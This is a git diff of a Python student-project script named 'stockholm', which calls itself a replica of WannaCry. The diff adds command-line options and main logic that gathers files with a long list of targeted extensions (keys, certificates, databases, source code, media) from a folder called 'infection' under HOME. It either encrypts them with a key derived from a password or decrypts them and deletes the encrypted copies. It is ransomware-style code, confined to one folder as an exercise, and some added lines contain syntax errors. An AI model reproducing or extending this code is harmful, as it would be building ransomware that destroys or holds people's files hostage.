@@ -6,7 +6,7 @@
 #    By: tvillare <tvillare@student.42madrid.com    +#+  +:+       +#+         #
 #                                                 +#+#+#+#+#+   +#+            #
 #    Created: 2023/05/18 18:07:39 by tvillare          #+#    #+#              #
-#    Updated: 2023/05/19 17:12:46 by tvillare         ###   ########.fr        #
+#    Updated: 2023/05/19 19:57:52 by tvillare         ###   ########.fr        #
 #                                                                              #
 # **************************************************************************** #
 
@@ -22,6 +22,33 @@ import pyAesCrypt
 from Crypto.Cipher import AES
 from Crypto.Random import get_random_bytes
 
+
+
+parser = argparse.ArgumentParser(description='Una replica del querer llorar(wanna cry)', add_help=False)
+#parser.add_argument('passwd',
+					#help='contraseña minimo 16 caracteres')
+
+parser.add_argument('-r', '--reverse',
+					dest="r",
+					type=str,
+					help='Cantidad de subniveles debusqueda')
+
+parser.add_argument('-s', '--silent',
+					dest='s',
+					action='store_true',
+					help='No mostrar output')
+
+parser.add_argument('-v', '--version',
+					dest='v',
+					action='store_true',
+					help='vecion del programa')
+
+parser.add_argument('-h', '--help',
+					dest='h',
+					action='store_true',
+					help='nueva ayuda')
+
+args = parser.parse_args()
 
 exet = ['.der', '.pfx', '.key', '.crt', '.csr', '.p12', '.pem', '.odt', '.ott', '.sxw', '.stw', '.uot', '.3ds', '.max', '.3dm', '.ods', '.ots', '.sxc', '.stc', '.dif', '.slk', '.wb2', '.odp', '.otp', '.sxd', '.std', '.uop', '.odg', '.otg', '.sxm', '.mml', '.lay', '.lay6', '.asc', '.sqlite3', '.sqlitedb', '.sql', '.accdb', '.mdb', '.db', '.dbf',
 		'.odb', '.frm', '.myd', '.myi', '.ibd', '.mdf', '.ldf', '.sln', '.suo', '.cs', '.c', '.cpp', '.pas', '.h', '.asm', '.js', '.cmd', '.bat', '.ps1', '.vbs', '.vb', '.pl', '.dip', '.dch', '.sch', '.brd', '.jsp', '.php', '.asp', '.rb', '.java', '.jar', '.class', '.sh', '.mp3', '.wav', '.swf', '.fla', '.wmv', '.mpg', '.vob', '.mpeg', '.asf',
@@ -44,10 +71,18 @@ def descifrar_archivo(input, clave):
 	#output = input.rstrip(".ft")
 	output = re.sub(r"\.ft$", "", input)
 	pyAesCrypt.decryptFile(input, output, clave, buffer_size)
+	os.remove(input)
 
 
 def get_passwd():
 	secret = input("Introduce la contraeña: ")
+	if (len(secret) < 16):
+		print("Contraseña muy corta")
+		sys.exit()
+	passwd = hashlib.sha256(secret.encode('utf-8')).digest()
+	return passwd
+
+def check_passwd(secret):
 	if (len(secret) < 16):
 		print("Contraseña muy corta")
 		sys.exit()
@@ -80,14 +115,22 @@ def	get_home():
 		print("NO Existe la carpeta infection en HOME o no es valida")
 		sys.exit()
 
-
-
 files = []
-#passwd = get_passwd()
-
 home = get_home()
-print(home)
-get_files("./pruebas", exet)
-for i in files:
-	print("file -> ", i)
+if (args.r == None)
+	passwd = get_passwd()
+	get_files(home, exet)
+	for doc in files:
+		cifrar_archivo(doc, passwd)
+else:
+	passwd = check_passwd(args.r)
+	get_files(home, exet_ft)
+	for doc in files:
+		descifrar_archivo(doc, passwd):
 
+if args.r != None:
+	for i in files:
+		print("file -> ", i)
+
+if args.v != None:
+	print("version stockholm 1.0")
